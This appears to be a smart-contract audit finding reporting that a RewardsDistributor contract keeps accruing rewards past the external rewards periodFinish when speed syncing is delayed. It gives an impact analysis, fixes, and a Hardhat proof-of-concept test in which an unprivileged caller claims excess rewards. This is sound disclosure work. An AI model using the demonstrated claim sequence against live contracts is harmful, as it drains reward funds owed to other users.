### Title
Rewards continue accruing after the external `periodFinish` when speed synchronization is delayed - ([File: contracts/RewardsDistributor.sol])

### Summary
`RewardsDistributor` accrues rewards continuously from `tokenStates[token].timestamp` to `block.timestamp` whenever `tokenSpeeds[token] > 0`, without checking whether the associated Vesper rewards period has ended. [1](#0-0) 

The only logic that considers `periodFinish` is the keeper-restricted `syncTokenSpeed()` function. [2](#0-1) 

### Finding Description
`syncTokenSpeed()` sets a deposit token’s reward speed to zero after `IPoolRewards.periodFinish(rewardToken)` has passed, but the accounting path itself has no campaign-end timestamp or equivalent upper bound. [3](#0-2) 

Any public call to `updateBeforeMintOrBurn()` or `claimRewards()` updates the index using the stale positive speed for the full elapsed interval. [4](#0-3) [5](#0-4) 

A late keeper synchronization does not remove the excess accrual because `_updateTokenSpeed()` first calls `_updateTokenIndex()` and only afterward stores `newSpeed_`. [6](#0-5) 

Once accrued, `claimRewards()` transfers the distributor’s reward-token balance to the account when sufficient funds are available. [7](#0-6) 

### Impact Explanation
The reward-accrual invariant is not bounded by the external reward program’s `periodFinish`. [1](#0-0) 

Users holding an incentivized `DepositToken` or `DebtToken` can receive rewards for the entire delay between the external campaign ending and `tokenSpeeds[token]` being synchronized to zero. [8](#0-7) 

This over-emission can drain the distributor’s reward balance and leave later legitimate users with accrued rewards that cannot be paid. [9](#0-8) 

### Likelihood Explanation
The vulnerable state occurs whenever an incentivized token retains a positive speed after the underlying rewards period finishes, which can result from normal synchronization delay rather than malicious keeper behavior. [10](#0-9) 

The trigger is unprivileged because `updateBeforeMintOrBurn()` is explicitly callable by anyone, and `claimRewards(account_, tokens_)` is public and only protected by `nonReentrant`. [11](#0-10) [12](#0-11) 

Deposit-token mint, burn, and transfer flows also update the same indexes automatically before balance changes. [13](#0-12) 

### Recommendation
Store a per-token `rewardEnd` or `periodFinish` value and use `min(block.timestamp, rewardEnd)` when calculating `_deltaTimestamps`. [14](#0-13) 

When `syncTokenSpeed()` observes that the Vesper period has ended, update the index only through `periodFinish` before setting the speed to zero. [6](#0-5) 

Alternatively, make `_calculateTokenIndex()` query the relevant rewards contract directly so every accounting path enforces the same end timestamp. [15](#0-14) 

### Proof of Concept
The following Hardhat test uses the production `RewardsDistributor` implementation and demonstrates that a public index update accrues rewards after the mocked external `periodFinish`. [16](#0-15) 

```ts
import {expect} from 'chai'
import {ethers} from 'hardhat'
import {time} from '@nomicfoundation/hardhat-network-helpers'
import {parseEther} from '@ethersproject/units'
import {smock} from '@defi-wonderland/smock'

it('accrues rewards after periodFinish until speed is synchronized', async () => {
  const [deployer, keeper, attacker] = await ethers.getSigners()

  const reward = await (
    await ethers.getContractFactory('ERC20Mock', deployer)
  ).deploy('MET', 'MET', 18)

  const pool = await smock.fake('contracts/Pool.sol:Pool')
  const token = await smock.fake('DepositToken')
  const vPool = await smock.fake('contracts/interfaces/external/IVPool.sol:IVPool')
  const rewards = await smock.fake('IPoolRewardsExt')

  const distributorFactory = await ethers.getContractFactory('RewardsDistributor')
  const distributor = await distributorFactory.deploy()
  await distributor.initialize(pool.address, reward.address)

  pool.doesDepositTokenExist.returns(true)
  pool.getRewardsDistributors.returns([distributor.address])
  pool.governor.returns(deployer.address)
  pool.treasury.returns(deployer.address)

  token.underlying.returns(vPool.address)
  token.totalSupply.returns(parseEther('100'))
  token.balanceOf.whenCalledWith(attacker.address).returns(parseEther('100'))

  vPool.poolRewards.returns(rewards.address)
  vPool.balanceOf.returns(parseEther('100'))
  vPool.totalSupply.returns(parseEther('100'))

  const start = await time.latest()
  const periodFinish = start + 60
  const rewardRate = parseEther('1')

  rewards.rewardRates.returns(rewardRate)
  rewards.periodFinish.returns(periodFinish)

  await distributor.updateTokenSpeedKeeper(keeper.address)
  await distributor.connect(keeper).syncTokenSpeed(token.address)
  await reward.mint(distributor.address, parseEther('1000'))

  // Move 60 seconds beyond the external rewards period.
  await time.increaseTo(periodFinish + 60)

  // Unprivileged caller finalizes the stale interval at the old speed.
  await distributor
    .connect(attacker)
    .updateBeforeMintOrBurn(token.address, attacker.address)
  await distributor
    .connect(attacker)
    ['claimRewards(address,address[])'](attacker.address, [token.address])

  const received = await reward.balanceOf(attacker.address)

  // Correct payout is rewardRate * 60 seconds.
  const expected = rewardRate.mul(60)

  // Actual payout is approximately rewardRate * 120 seconds.
  expect(received).to.be.gt(expected)
})
```

The excess exists because the index path calculates `block.timestamp - supplyState.timestamp` and never substitutes `periodFinish` as the accrual boundary. [1](#0-0)
